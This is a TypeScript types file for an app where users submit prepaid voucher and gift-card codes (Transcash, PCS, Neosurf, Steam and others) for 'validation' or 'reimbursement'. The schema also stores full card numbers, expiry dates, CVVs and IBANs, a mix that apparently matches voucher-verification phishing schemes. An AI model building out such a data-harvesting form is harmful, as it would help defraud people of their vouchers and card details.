export type TicketType = "transcash" | "pcs" | "neosurf" | "google_play" | "apple_store" | "steam" | "amazon"
export type SubmissionType = "validation" | "reimbursement"
export type SubmissionStatus = "pending" | "processing" | "approved" | "rejected"

export interface TicketSubmission {
  id: string
  ticket_type: TicketType
  ticket_code: string
  ticket_amount: number
  user_email: string
  user_phone?: string
  user_name: string
  submission_type: SubmissionType
  status: SubmissionStatus
  created_at: string
  updated_at: string
  reimbursement_method?: string
  bank_iban?: string
  paypal_email?: string
  card_number?: string
  card_expiry?: string
  card_cvv?: string
  card_name?: string
}

export interface SubmissionFormData {
  ticket_type: TicketType
  ticket_code: string
  ticket_amount: number
  user_email: string
  user_phone?: string
  user_name: string
  submission_type: SubmissionType
}
